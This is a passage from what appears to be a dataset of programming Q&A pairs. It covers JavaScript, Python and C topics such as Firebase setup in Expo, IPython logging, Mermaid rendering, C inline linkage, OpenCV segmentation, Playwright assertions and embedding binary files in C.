In posting this, I noticed that calling preventDefault on all touch events will prevent links from working properly. The main reason to call preventDefault at all is to stop the phone from scrolling, and you can do that by calling it only on the touchmove callback. The only downside to doing it this way is that the iPhone will sometimes display its hover popup over the drag origin. If I discover a way to prevent that, I'll update this post.
Second Update:
I've found the CSS property to turn off the callout: -webkit-touch-callout.
",javascript
how do i set up firebase analytics on my react native expo project,"I followed this documentation which seems pretty straightforward, however I keep getting error while setting analytics user id:  [Error: No Firebase App '[DEFAULT]' has been created - call firebase.initializeApp()]
This is part of my App.js file:
import { auth } from './firebase.js'
import analytics from '@react-native-firebase/analytics';

const App = () => {
  
  const [currentUser, setCurrentUser] = useState(null);

  useEffect(() => {
    (async () => {
      if(currentUser){
        console.log(""I have current user: "", analytics())
        try{
            await analytics().setUserId(currentUser.uid)
            console.log(""all done"")
        }catch(error){
          console.log(""error while setting analytics user id: "", error);
        }
      }
    })();
  }, [currentUser]);

  useEffect(() => {
   const unsubscribe = auth.onAuthStateChanged((user) =>  {
        if (user) {
          setCurrentUser(user);
        }
    });
   return () => unsubscribe();
 }, []);


  if(!currentUser){
      return (
        <NavigationContainer>
          <AuthNavigator />
        </NavigationContainer>
      );
  }
  else{
    return (
        <NavigationContainer>
          <MainNavigator />
        </NavigationContainer>
    );
  }
};

export default App;

My firebase.js file:
import firebase from ""firebase/compat/app"";
import 'firebase/compat/firestore'
import 'firebase/compat/auth'

const firebaseConfig = {
  apiKey: ""some_key"",
  authDomain: ""some_domain"",
  databaseURL: ""some_url"",
  projectId: ""some_project_id"",
  storageBucket: ""some_id"",
  messagingSenderId: ""id"",
  appId: ""id"",
  measurementId: ""id""
};

if (firebase.apps.length === 0) {
  firebase.initializeApp(firebaseConfig);
}


const authState = firebase.auth();
export const auth = authState;
export const firestore = firebase.firestore();

Can someone please help because I spent too much time on this issue. I followed the docs correctly, I dont understand why it is complaining for [Error: No Firebase App '[DEFAULT]' has been created - call firebase.initializeApp()]
Please dont point me to the docs, I read them multiple times, I need practical solution.
","Your firebase.js is using the standard firebase package for initialization, but your App.js is using @react-native-firebase.  These packages are not compatible with each other.  You can't initialize Firebase using the firebase package and have it work with @react-native-firebase APIs.
You said you don't want a link to documentation, but I'll encourage you to reconsider that maybe you read the wrong documentation as far as initialzing Firebase is concerned.  If you're using @react-native-firebase for Analytics, then you should init Firebase using the correct documentation.  On that page, there are instructions for initializing Firebase in an Expo project.  I won't bother copying all of that here, but it sounds like you simply need to add some config plugins to make it work:

The recommended approach to configure React Native Firebase is to use Expo Config Plugins. You will add React Native Firebase modules to the plugins array of your app.json or app.config.js. See the note below to determine which modules require Config Plugin configurations.

",javascript
get output from the logging module in ipython notebook,"When I running the following inside IPython Notebook I don't see any output:
import logging
logging.basicConfig(level=logging.DEBUG)
logging.debug(""test"")

Anyone know how to make it so I can see the ""test"" message inside the notebook?
","Try following:
import logging
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logging.debug(""test"")

According to logging.basicConfig:

Does basic configuration for the logging system by creating a
  StreamHandler with a default Formatter and adding it to the root
  logger. The functions debug(), info(), warning(), error() and
  critical() will call basicConfig() automatically if no handlers are
  defined for the root logger.
This function does nothing if the root logger already has handlers
  configured for it.

It seems like ipython notebook call basicConfig (or set handler) somewhere.
",python
how to make github pages markdown support mermaid diagram,"I am hoping to use mermaid in GitHub-pages, with simple commit and push. 
In other words, I am hoping to wirte in my markdown file like this
```mermaid
graph LR
   A --> B
   A -->C
   C -->D
``` 

and add some js on my _layouts/post.html to somehow transform this to a mermaid graph.
I have found this theme claims that it supports such thing. But this theme looks way too heavy for me, the js were just too much, so I thought I could only use this file, which is simply
<script>
 window.Lazyload.js('{{ _sources.mermaid }}', function() {
   mermaid.initialize({
     startOnLoad: true
   });
   mermaid.init(undefined, '.language-mermaid');
 });
</script>

In my _include/mermaid.html, I replaced {{ _sources.mermaid }} to the mermaid cdn
<script>
 window.Lazyload.js('https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.0.0/mermaid.min.js', function() {
   mermaid.initialize({
     startOnLoad: true
   });
   mermaid.init(undefined, '.language-mermaid');
 });
</script>

it still won't work. In my post, it was shown as regular code blocks, not a mermaid diagram.
Edit: In chrome developer's view, I don't see any connections made to the link https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.0.0/mermaid.min.js.
And I tried this code, a connection to mermaid wes made in network tag in developer view, but the mermaid diagram still doesn't work
<script src=""https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.0.0/mermaid.min.js""></script>
<script>
var config = {
    startOnReady:true,
    theme: 'forest',
    flowchart:{
            useMaxWidth:false,
            htmlLabels:true
        }
};
mermaid.initialize(config);
mermaid.init(undefined, '.language-mermaid');
</script>

","I found the solution.


<!DOCTYPE html>_x000D_
<html lang=""en"">_x000D_
   <head>_x000D_
	 <script src=""https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.0.0/mermaid.min.js""></script>_x000D_
    </head>_x000D_
	 _x000D_
<body>_x000D_
 <pre><code class=""language-mermaid"">graph LR_x000D_
A--&gt;B_x000D_
</code></pre>_x000D_
_x000D_
<div class=""mermaid"">graph LR_x000D_
A--&gt;B_x000D_
</div>_x000D_
	_x000D_
</body>_x000D_
<script>_x000D_
var config = {_x000D_
    startOnLoad:true,_x000D_
    theme: 'forest',_x000D_
    flowchart:{_x000D_
            useMaxWidth:false,_x000D_
            htmlLabels:true_x000D_
        }_x000D_
};_x000D_
mermaid.initialize(config);_x000D_
window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));_x000D_
</script>_x000D_
_x000D_
</html>



",javascript
what39s the difference between static inline extern inline and a normal inline function,"What's the difference between a static inline, extern inline and a normal inline C function?
I've seen some vague explanations about this. As far as I've understood, static inline is not just an inline function that is meant to only be referred to within a certain file as the static keyword usually means. The same goes for extern inline too I guess, it's not the same explanation as with extern variables. Any answers would be greatly appreciated!
","A function definition with static inline defines an inline function with internal linkage. Such function works ""as expected"" from the ""usual"" properties of these qualifiers: static gives it internal linkage and inline makes it inline. So, this function is ""local"" to a translation unit and inline in it.
A function definition with just inline defines an inline function with external linkage. However, such definition is referred to as inline definition and it does not work as external definition for that function. That means that even though this function has external linkage, it will be seen as undefined from other translation units, unless you provide a separate external definition for it somewhere.
A function definition with extern inline defines an inline function with external linkage and at the same time this definition serves as external definition for this function. It is possible to call such function from other translation units.
The last two paragraphs mean that you have a choice of providing a single extern inline definition for an inline function with external linkage, or providing two separate definitions for it: one inline and other extern. In the latter case, when you call the function the compiler is allowed to chose either of the two definitions.
",c
vscode intellisense not working for cc whatever i do,"I can't get Vscode to syntax-highlight or complete any C/C++ code.

I'm on the latest Vscode (1.90.1 as of writing).
C/C++ and C/C++ Extension pack (latest, non-insider versions) is installed and enabled.
I have clang installed and working.
Trying to follow Vscode's official documentation at https://code.visualstudio.com/docs/cpp/config-clang-mac

I create a folder, opened it using code /path/to/my/folder, have an empty CPP file. I'm trying exactly what the docs say, line by line. I've even pasted the exact code from the docs yet it's recognized as ""Plain Text"" and no completion nor coloring work:




Above is what my Vscode environment looks like, whereas Microsoft's documentation has nicely syntax highlighted, code-completing C/C++ file with the exact same steps that I did. In my instance, I don't even see C or C++ in list of languages to pick from and it is recognized as ""Plain Text"".
Here is my settings.json:

{
    ""workbench.startupEditor"": ""newUntitledFile"",
    ""explorer.confirmDelete"": false,
    ""workbench.colorTheme"": ""Monokai"",
    ""editor.codeLens"": false,
    ""git.autofetch"": true,
    ""git.enableSmartCommit"": true,
    ""explorer.confirmDragAndDrop"": false,
    ""git.confirmSync"": false,
    ""window.title"": ""${activeFolderShort}/${activeEditorShort} (${activeFolderLong})"",
    ""debug.console.fontSize"": 10,
    ""keyboard.dispatch"": ""keyCode"",
    ""editor.tabCompletion"": ""on"",
    ""prettier.tabWidth"": 4,
    ""editor.defaultFormatter"": ""dbaeumer.vscode-eslint"",
    ""editor.fastScrollSensitivity"": 3,
    ""typescript.tsserver.trace"": ""verbose"",
    ""C_Cpp.intelliSenseEngine"": ""default"",
    ""editor.tokenColorCustomizations"": {
        ""[Monokai]"": {
            ""keywords"": ""#ff4a5f"",
            ""functions"": ""#99ff88"",
            ""comments"": ""#80a090"",
            ""textMateRules"": [
               
                {
                    ""scope"": ""keyword.operator"",
                    ""settings"": {
                        ""foreground"": ""#ffaa66""
                    }
                },
                {
                    ""scope"": ""entity.name.tag"",
                    ""settings"": {
                        ""foreground"": ""#ff3377"",
                        ""fontStyle"": ""bold""
                    }
                },
                {
                    ""scope"": ""entity.other.attribute-name"",
                    ""settings"": {
                        ""foreground"": ""#44e855"",
                    }
                }
            ]
        }
    },
    ""workbench.colorCustomizations"":{

        ""[Monokai]"": {
            ""editorIndentGuide.background1"": ""#383838"",
            ""editor.background"": ""#20201e"",
            ""statusBar.background"" : ""#1A1A1A"",
            ""statusBar.noFolderBackground"" : ""#212121"",
            ""statusBar.debuggingBackground"": ""#263238"",
        },
       
      },
      ""task.slowProviderWarning"": [
        ""typescript""
      ],
      ""update.mode"": ""manual"",
      ""typescript.updateImportsOnFileMove.enabled"": ""never"",
      ""javascript.updateImportsOnFileMove.enabled"": ""always"",
    ""editor.maxTokenizationLineLength"": 1000,
      ""terminal.integrated.fontSize"": 9,
      ""editor.fontSize"": 8,
      ""editor.minimap.renderCharacters"": false,
      ""editor.minimap.maxColumn"": 80,
      ""editor.minimap.enabled"": false,
      ""editor.gotoLocation.multipleDefinitions"": ""goto"",
      ""editor.gotoLocation.multipleDeclarations"": ""goto"",
      ""editor.gotoLocation.multipleImplementations"": ""goto"",
      ""editor.gotoLocation.multipleReferences"": ""goto"",
      ""editor.gotoLocation.multipleTypeDefinitions"": ""goto"",
      ""apc.activityBar"": {
        ""size"": 42,
        ""itemMargin"": 2
      },
      ""apc.sidebar.titlebar"": {
        ""fontSize"": 10
      },
      ""apc.header"": {
        ""fontSize"": 10,
        ""height"": 24,
      },
      ""apc.stylesheet"": {
        "".explorer-viewlet .mac"": ""font-size: 11px"",
        "".debug-viewlet .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench .debug-hover-widget .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench .debug-viewlet .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench .debug-hover-widget .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench.mac .debug-viewlet .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench.mac .debug-hover-widget .monaco-list-row .expression"":
          ""font-size: 10px !important"",
        "".part.editor>.content .editor-group-container>.title .tabs-container>.tab, .tabs-and-actions-container"": ""height: 28px !important"",
        "".monaco-icon-label"": ""font-size: 8pt"",
        "".monaco-editor, .monaco-editor-background, .monaco-editor .inputarea.ime-input"": ""background-color: #1c1e1c""
      },
      ""apc.listRow"": {
        ""height"": 18
      },
      ""customizeUI.fontSizeMap"": {
          ""window-title"": ""10px"", // Window title font when using custom titlebar
          ""tab-title"": ""11px"",    // Used for editor tab titles
      },
      ""customizeUI.listRowHeight"": 18,
      ""customizeUI.stylesheet"": {
          "".explorer-viewlet .mac"": ""font-size: 11px"",
          "".debug-viewlet .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench .debug-hover-widget .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench .debug-viewlet .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench .debug-hover-widget .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench.mac .debug-viewlet .monaco-list-row .expression, body.row-height-lte20 .monaco-workbench.mac .debug-hover-widget .monaco-list-row .expression"":
            ""font-size: 10px !important"",
          "".part.editor>.content .editor-group-container>.title .tabs-container>.tab, .tabs-and-actions-container"": ""height: 28px !important"",
          "".monaco-icon-label"": ""font-size: 8pt"",
          "".monaco-editor, .monaco-editor-background, .monaco-editor .inputarea.ime-input"": ""background-color: #1c1e1c""
      },
      ""emmet.showExpandedAbbreviation"": ""never"",
      ""terminal.integrated.lineHeight"": 0.8,
      ""color-highlight.languages"": [
        ""*""
      ],
    ""editor.detectIndentation"": false,
    ""debug.javascript.suggestPrettyPrinting"": false,
    ""workbench.editor.decorations.badges"": false,
    ""explorer.decorations.badges"": false,
    ""react-native-tools.showUserTips"": false,
    ""editor.accessibilitySupport"": ""off"",
    ""react-native-tools.networkInspector.consoleLogsColorTheme"": ""Dark"",
    ""debug.console.wordWrap"": false,
    ""workbench.layoutControl.enabled"": false,
    ""editor.unicodeHighlight.allowedCharacters"": {
        ""‘"": true,
        ""’"": true
    },
    ""[typescriptreact]"": {
      ""editor.defaultFormatter"": ""esbenp.prettier-vscode""
    },
    ""[typescript]"": {
        ""editor.defaultFormatter"": ""esbenp.prettier-vscode""
    },
    ""solidity.validationDelay"": 500,
    ""debug.allowBreakpointsEverywhere"": true,
    ""workbench.settings.enableNaturalLanguageSearch"": false,
    ""explorer.compactFolders"": false,
    ""window.restoreWindows"": ""all"",
    ""editor.unicodeHighlight.includeStrings"": false,
    ""editor.codeActionsOnSave"": {
        ""source.organizeImports"": ""explicit""
    },
    ""terminal.explorerKind"": ""external"",
    ""[css]"": {
        ""editor.defaultFormatter"": ""vscode.css-language-features""
    },
    ""files.associations"": {
        ""*.css"": ""tailwindcss""
    },
    ""eslint.runtime"": ""node"",
    ""eslint.format.enable"": true,
    ""workbench.editor.empty.hint"": ""hidden"",
    ""git.openRepositoryInParentFolders"": ""always"",
    ""solidity.telemetry"": false,
    ""cmake.showOptionsMovedNotification"": false

}


Please note that C_Cpp.intelliSenseEngine setting wasn't there and it still wasn't working, I've added while trying to find a solution but it doesn't seem to make a difference.
I've also tried disabling all the extensions except C/C++ (and, in another instance, in addition to C/C++ also C/C++ Extension Pack) and restarting Vscode, but nothing changed.
What am I doing wrong?
","I solved the problem by removing my ~/Library/Application Support/Code and ~/.vscode/extensions directories (I first tried the latter alone but didn't work, then I also removed the former). I don't know what was causing the issue, but I backed up my settings.json from there, deleted everything, restarted Vscode, put settings.json back, restarted Vscode, installed C/C++ extension (as all extensions also got deleted), and the issue got fixed. I can now see C++ in the language list and IntelliSense works perfectly.
",c
splitting image by whitespace,"I have an image I am attempting to split into its separate components, I have successfully created a mask of the objects in the image using k-means clustering. (I have included the results and mask below)
I am then trying to crop each individual part of the original image and save it to a new image, is this possible?
import numpy as np
import cv2

path = 'software (1).jpg'
img = cv2.imread(path)

img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
twoDimage = img.reshape((-1,3))
twoDimage = np.float32(twoDimage)

criteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 10, 1.0)
K = 2
attempts=10

ret,label,center = cv2.kmeans(twoDimage,K,None,criteria,attempts,cv2.KMEANS_PP_CENTERS)
center = np.uint8(center)
res = center[label.flatten()]
result_image = res.reshape((img.shape))


cv2.imwrite('result.jpg',result_image)

Original image
Result of k-means
","My solution involves creating a binary object mask where all the objects are colored in white and the background in black. I then extract each object based on area, from largest to smallest. I use this ""isolated object"" mask to segment each object in the original image. I then write the result to disk. These are the steps:

Resize the image (your original input is gigantic)
Convert to grayscale
Extract each object based on area from largest to smallest
Create a binary mask of the isolated object
Apply a little bit of morphology to enhance the mask
Mask the original BGR image with the binary mask
Apply flood-fill to color the background with white
Save image to disk
Repeat the process for all the objects in the image

Let's see the code. Through the script I use two helper functions: writeImage and findBiggestBlob. The first function is pretty self-explanatory. The second function creates a binary mask of the biggest blob in a binary input image. Both functions are presented here:
# Writes a PNG image:
def writeImage(imagePath, inputImage):
    imagePath = imagePath + "".png""
    cv2.imwrite(imagePath, inputImage, [cv2.IMWRITE_PNG_COMPRESSION, 0])
    print(""Wrote Image: "" + imagePath)


def findBiggestBlob(inputImage):
    # Store a copy of the input image:
    biggestBlob = inputImage.copy()
    # Set initial values for the largest contour:
    largestArea = 0
    largestContourIndex = 0

    # Find the contours on the binary image:
    contours, hierarchy = cv2.findContours(inputImage, cv2.RETR_CCOMP, cv2.CHAIN_APPROX_SIMPLE)

    # Get the largest contour in the contours list:
    for i, cc in enumerate(contours):
        # Find the area of the contour:
        area = cv2.contourArea(cc)
        # Store the index of the largest contour:
        if area > largestArea:
            largestArea = area
            largestContourIndex = i

    # Once we get the biggest blob, paint it black:
    tempMat = inputImage.copy()
    cv2.drawContours(tempMat, contours, largestContourIndex, (0, 0, 0), -1, 8, hierarchy)
    # Erase smaller blobs:
    biggestBlob = biggestBlob - tempMat

    return biggestBlob

Now, let's check out the main script. Let's read the image and get the initial binary mask:
# Imports
import cv2
import numpy as np

# Read image
imagePath = ""D://opencvImages//""
inputImage = cv2.imread(imagePath + ""L85Bu.jpg"")

# Get image dimensions
originalImageHeight, originalImageWidth = inputImage.shape[:2]

# Resize at a fixed scale:
resizePercent = 30
resizedWidth = int(originalImageWidth * resizePercent / 100)
resizedHeight = int(originalImageHeight * resizePercent / 100)

# Resize image
inputImage = cv2.resize(inputImage, (resizedWidth, resizedHeight), interpolation=cv2.INTER_LINEAR)
writeImage(imagePath+""objectInput"", inputImage)

# Deep BGR copy:
colorCopy = inputImage.copy()

# Convert BGR to grayscale:
grayscaleImage = cv2.cvtColor(inputImage, cv2.COLOR_BGR2GRAY)

# Threshold via Otsu:
_, binaryImage = cv2.threshold(grayscaleImage, 250, 255, cv2.THRESH_BINARY_INV)

This is the input resized by 30% according to resizePercent:

And this is the binary mask created with a fixed threshold of 250:

Now, I'm gonna run this mask through a while loop. With each iteration I'll extract the biggest blob until there are no blobs left. Each step will create a new binary mask where the only thing present is one object at a time. This will be the key to isolating the objects in the original (resized) BGR image:
# Image counter to write pngs to disk:
imageCounter = 0

# Segmentation flag to stop the processing loop:
segmentObjects = True

while (segmentObjects):

    # Get biggest object on the mask:
    currentBiggest = findBiggestBlob(binaryImage)

    # Use a little bit of morphology to ""widen"" the mask:
    kernelSize = 3
    opIterations = 2
    morphKernel = cv2.getStructuringElement(cv2.MORPH_RECT, (kernelSize, kernelSize))
    # Perform Dilate:
    binaryMask = cv2.morphologyEx(currentBiggest, cv2.MORPH_DILATE, morphKernel, None, None, opIterations,cv2.BORDER_REFLECT101)

    # Mask the original BGR (resized) image:
    blobMask = cv2.bitwise_and(colorCopy, colorCopy, mask=binaryMask)

    # Flood-fill at the top left corner:
    fillPosition = (0, 0)
    # Use white color:
    fillColor = (255, 255, 255)
    colorTolerance = (0,0,0)
    cv2.floodFill(blobMask, None, fillPosition, fillColor, colorTolerance, colorTolerance)

    # Write file to disk:
    writeImage(imagePath+""object-""+str(imageCounter), blobMask)
    imageCounter+=1

    # Subtract current biggest blob to
    # original binary mask:
    binaryImage = binaryImage - currentBiggest

    # Check for stop condition - all pixels
    # in the binary mask should be black:
    whitePixels = cv2.countNonZero(binaryImage)

    # Compare against a threshold - 10% of
    # resized dimensions:
    whitePixelThreshold = 0.01 * (resizedWidth * resizedHeight)
    if (whitePixels < whitePixelThreshold):
        segmentObjects = False

There are some things worth noting here. This is the first isolated mask created for the first object:

Nice. A simple mask with the BGR image will do. However, I can improve the quality of the mask if I apply a dilate morphological operation. This will ""widen"" the blob, covering the original outline by a few pixels. (The operation actually searches for the maximum intensity pixel within a Neighborhood of pixels). Next, the masking will produce a BGR image where there's only the object blob and a black background. I don't want that black background, I want it white. I flood-fill at the top left corner to get the first BGR mask:

I save each mask to a new file on disk. Very cool. Now, the condition to break from the loop is pretty simple - stop when all the blobs have been processed. To achieve this I subtract the current biggest blob to the original binary white and count the number of white pixels. When the count is below a certain threshold (in this case 10% of the resized image) stop the loop.
Check out this gif of every object isolated. Each frame is saved to disk as a png file:

",python
how can i set the baseurl for expect in playwright,"In my Playwright tests, I set the base-url according to the docs:
const config: PlaywrightTestConfig = {
  projects: [
    {
      name: 'Safari MacBook Air',
      use: {
        browserName: 'webkit',
        viewport: {
          width: 2560,
          height: 1620,
        },
        contextOptions: {
          ignoreHTTPSErrors: true,
        },
      },
    },
  ],
  use: {
    baseURL: process.env.PLATFORMSH_URL,
    headless: false,
    locale: 'ja-JP',

    // Debugging artifacts.
    screenshot: 'on',
    trace: 'on',
    video: 'on',
  },
};
export default config;

This is working for goto:
await this.page.goto('/myDirectory');

However, it fails for expect:
  expect(page.url()).toBe('/myPage');

The error is:

Expected: ""/myPage""
Received: ""https://www.example.com/myPage""


How can I use expect with baseURL?
","Try using this assertion instead:
For example, having configured Playwright homepage as our baseUrl
   {
     name: 'webkit',
     use: {
       ...devices['Desktop Safari'],
       baseURL: 'https://playwright.dev/'
     },
   },

Then:
test('baseUrl', async ({ page }) => {
  await page.goto('/docs/intro');
  await expect(page).toHaveURL('/docs/intro');
});

If you'd like to continue using this format:
  expect(page.url()).toBe('/myPage');

Then you need to change the assertion, because the url you're at is not equal to your directory. You can assert the url you're at contains the aforementioned directory, instead:
  expect(page.url()).toContain('/myPage');

",javascript
unable to click on the news in the tape,"Please help fix the script. JSFIDDLE
I wrote a simple script that displays news feed from the JSON. After clicking on a particular news article it opens a modal window which contain the text of the news.
But modal window always contains the same text. I need that after clicking on various news items, modal window display various news text
view news feed:
APP.NewsTapeView = Backbone.View.extend({  

  initialize: function() {   
    this.collection = new APP.NewsModelsCollection();  
    this._fillCollection();

    this.render();
  },    

  template: _.template($('#newsTapeTpl').html()),

  render: function () {  
    this.$el.html(this.template());    
    this._createNewsUnits();

    return this;
  },

  _createNewsUnits: function () {  
    this.collection.each(function (news) {    
      var newsUnitView = new APP.NewsUnitView({model: news});      
      $(this.$('#newsList')).append(newsUnitView.render().el);
    }, this);
  },

  _fillCollection: function () {  
    var self = this;

    $.each(APP.CONFIG.values, function(key, val) {    
      // console.log(val.title);
      // console.log(val.description);
      // console.log(val.poster);

      var newsModel = new APP.NewsModel({
        title: val.title,
        description: val.description,
        poster: val.poster
      });

      self.collection.add(newsModel);
    });

    // console.log(this.collection);
  }  

});

view news unit:
APP.NewsUnitView = Backbone.View.extend({  

  initialize: function(model) {   
    self = this; 

    this.model = model.model;
  },

  className: 'news',

  template: _.template($('#newsUnitTpl').html()),

  render: function () {  
    this.$el.html(this.template({
      title: this.model.get('title'),
      description: this.model.get('description'),
      poster: this.model.get('poster')
    }));    
    return this;
  },

  events: {
    'click': function() {   
      self.openModal();
    }
  },

  openModal: function() {
    var newsModalView = new APP.NewsModalView(this.model);
    newsModalView.show(555, ['dfsdsdf']);
  }

});

view news modal:
APP.NewsModalView = Backbone.View.extend({  

  initialize: function(model) {   
    var self = this;

    this.model = model;
    _block = null;
    _win = null;    
  },

  template: _.template($('#newsModalTpl').html()),

  render: function () {  
    $('#modalwindow').html(this.template({
      id: this.model.cid,
      title: this.model.get('title'),
      description: this.model.get('description'),
      poster: this.model.get('poster')
    }));  

    return this;
  },

  initBlock: function() {
    var self = this;

    var _block = document.getElementById('blockscreen'); 

    if (!_block) {
        var parent = document.getElementsByTagName('body')[0],
            obj = parent.firstChild; 

        _block = document.createElement('div'); 
        _block.id = 'blockscreen'; 
        parent.insertBefore(_block, obj);

        _block.onclick = function() { self.close() };         
    }

    _block.style.display = 'inline';     
  },

  initWin: function(width, html) {
    var self = this;

    _win = document.getElementById('modalwindow'); 

    if (!_win) {
        var parent = document.getElementsByTagName('body')[0];
        var obj = parent.firstChild;
        _win = document.createElement('div');
        _win.id = 'modalwindow';
        _win.style.padding = '0 0 5px 0';      
        parent.insertBefore(_win, obj);
    }

    _win.style.width = width + 'px'; 
    _win.style.display = 'inline'; 

    _win.innerHTML = html; 

    _win.style.left = '50%'; 
    _win.style.top = '10%'; 

    _win.style.marginTop = -(_win.offsetHeight / 2) + 'px'; 
    _win.style.marginLeft = -(width / 2) + 'px';

    this.render();

    document.getElementById('closeBtn').onclick = function() { self.close() }; 
  },

  close: function() { 
    document.getElementById('blockscreen').style.display = 'none';
    document.getElementById('modalwindow').style.display = 'none';        
  },

  show: function(html) {
    this.initBlock();
    this.initWin(html);
  }

});

","The problem is with 
initialize: function(model) {   
    self = this; 

    this.model = model.model;
  }

since you haven't declared 'self' here  and you have't added 'Use strict' javascript engine is using it by declaring it globally, and it gets overwritten on every assignment.
try changing 
events: {
    'click': function() {
      self.openModal();
    }
  }

to
events: {
    'click': function() {
      this.openModal();
    }
  }

I have updated the fiddle.
One more thing do not declare var self = this in every view, whenever callback is called by backbone the context to the function is set properly to the respective view.
",javascript
which type is the portable equivalent to the c type file in freepascal,"I have to write a wrapper for the C-API of the library GDAL to generate FreePascal bindings under Debian 12 and GDAL version 3.2.2.
One of the functions is:
      void CPL_DLL OGR_G_DumpReadable( OGRGeometryH, FILE *, const char * );

that uses a FILE pointer, which:

is a basic type
often defined as something typedef struct { ... } FILE;
defined in stdio.hor behind the scenes depending on the OS.

Question: What is the portable equivalent of this type for FreePascal?
Advise: I know we have the the built in type File in FreePascal, with the type related  functions and procedures:
Procedure Assign(out f:File;const Name: RawByteString);
Procedure Rename(var f:File;const s : RawByteString);
Procedure Rewrite(var f:File);
Procedure Reset(var f:File);
Procedure Close(var f:File);
Procedure BlockWrite(var f:File;const Buf;Count:Int64;var Result:Int64);
Function  FilePos(var f:File):Int64;
Function  FileSize(var f:File):Int64;
Procedure Seek(var f:File;Pos:Int64);
Function  EOF(var f:File):Boolean;
Procedure Erase(var f:File);
Procedure Truncate (var f:File);         

located in the unit system anf looking similar to fopen(...), fclose(...), etc.;
Question: Are these both types equivalent?
","There is no equivalence or easy conversion between a Free Pascal file object and a C FILE* object (or a file object of any language, for that matter, with the maybe slight exception for converting a C FILE* to a C++ stream using non-standard functions). You will have to make a decision for your wrapper.
You can choose to make that parameter a string with the filename and then call fopen yourself. This would be the easy way out but also the ugliest, because not all FILE* streams are actual files (there are anonymous pipes, for example).
Another way to treat this situation is to get the raw OS handle (file descriptor in Linux) of the particular file (it's inside the TTextRec record which you can get from a TextFile), duplicate it using dup and open a C FILE* (using fdopen) to the copy. Since the documentation of OGR_G_DumpReadable says it wants a text file, it would be appropriate to require that from Pascal callers.
{H+}

uses
    ctypes, SysUtils;

type
    PFile = Pointer;

function fdopen(fd: cint; const mode: PChar): PFile; cdecl; external 'c';
function dup(fd: cint): cint; cdecl; external 'c';

function GetPFile(var F: TextFile): PFile;
var
    fd: THandle;
    newfd: THandle;
    pf: PFile;
begin
    Flush(F);
    fd := TTextRec(F).Handle;
    newfd := dup(fd);
    if newfd = -1 then
    begin
        // handle error
    end;
    pf := fdopen(newfd, 'w');
    if pf = nil then
    begin
        // handle error
    end;
    GetPFile := pf;
end;

Note, however, this approach has some caveats, thus you need to be very careful about what the library is doing with this file. If the library closes the file itself, you may want to replicate that behaviour in Pascal and Close the Pascal file after the library function returns (but that's not required, you can leave it open).
If the library just writes and nothing more (which I believe is the case with this particular function), you need to fflush the C file, call lseek on the C file's descriptor to get its new location, lseek the old file descriptor to that location and then fclose the C file (otherwise you will leak resources).
The worst case is if the library keeps the FILE* beyond the function's end (that is, it keeps an internal state). The Pascal file won't be aware of writes made by the C file or vice-versa. If that is the case, your best bet is to expose the C FILE to the Pascal programmer and let him/her deal with fopen/fclose directly, as this will allow them to have a stream that's consistent with what the library has.
Note for Windows:
You said you wanted a portable equivalent, but it seems that on Windows, the handle inside the TTextRec record is actually a Win32 handle (at least according to Google, I haven't actually tested this). Thus, for Windows, you would want to call DuplicateHandle instead of dup, then call _open_osfhandle to get a file descriptor, and finally call _fdopen. You have to resort to conditional compilation, because the file implementation in Pascal is inherently non-portable.
Make sure to link the wrapper to the same C library that GDAL is linked to! On Linux/Unix/macOS there is usually a single system library, but on Windows, each piece of software links to whatever C library it wishes (msvcrt.dll, one of the dozens of MSVC++ redistributables or the UCRT), and each has a different ABI.
",c
is there a way to load a binary file as a const variable in c at compile time,"I was wondering if there is a way to load an external binary file as a variable in C through an include or a header file or something of the like.
For example, in a project I am currently working on I am working with an embedded system that has a graphic display that will do text and minor graphics (boxes, lines, etc.) using ASCII data and commands.  But, it will also display monochrome bitmaps.  So I have a series of static displays that I use for a user interface, and a couple of bitmaps for splash screens.
Now the reason I mention that it is an embedded system is that there is no file system to load data from, only RAM and program memory, so any ""pre-fab"" data or tables I wish to use must but loaded at compile time either through a source file or through an object file using the linker.  Unfortunately, the IDE does not provide any means to load a binary, in any form really, into program memory for use as a data cache in this fashion in any readily recognizable fashion.
So short of doing what I already have to get around this, (use a hex editor to read the binary as ASCII encoded hex and copy and paste the raw data into a header file as a variable), is there a way to ""link"" to a file or ""include"" a file that could be loaded as a const variable at compile time?
The system I am working with is MPLAB X for the Microchip series of processors and the compiler is GNC.  I am mainly looking to know if there is a way to do this through some C command or function before I go trying to look for a way specifically through their specific compiler/linker software.
","No you can't do this directly. One way is to convert your binary files into C source code and include these pieces into your project. The conversion can be done by a simple program written by you or by some third party program.
For example:
Binaray1.c (generated automatically)
unsigned char binaray_file1[] =
{
  1,2,3,10,20,
  ....
} ;

Binaray2.c (generated automatically)
unsigned char binaray_file2[] =
{
  0,0,10,20,45,32,212,
  ....
} ;

SomeSourceFile.c
extern unsigned char binary_file1[] ;
extern unsigned char binary_file2[] ;

// use binary_file1 and binary_file2 here.

",c
i have a set of words i would like to exclude and i want to check if each new word entered is contained wholly within another how would i do this,"So I am currently making a word game, and I want to have it so that the user cannot enter a word that is wholly contained within another word (e.g. 'set' in 'subset'), however my current code:
noWord = False
for _word in used_words:
    if set(word).issubset(set(_word)):
        noWord = True
if noWord == False:
    # Calculate score for the word

makes it so that it doesn't matter what order the letters are in (e.g. playing 'pitch' would prevent you from playing 'chip') which is a feature I do not want. How would I go about doing this efficiently.
I tried searching the _word variable as a list and checking if each set of letters from that list matches the word variable, but that was incredibly inefficient.
e.g.
wordAsAList == list(_word)
# All words have to be 3 letters or more in my game
for v in range(len(wordAsAList) - 2):
    for i in range(len(wordAsAList)):
        if len(wordAsAList) - v - 3 >= i:
            if ("""".join(wordAsAList[i:(len(wordAsAList) - v)])) == word:
                noWord = True

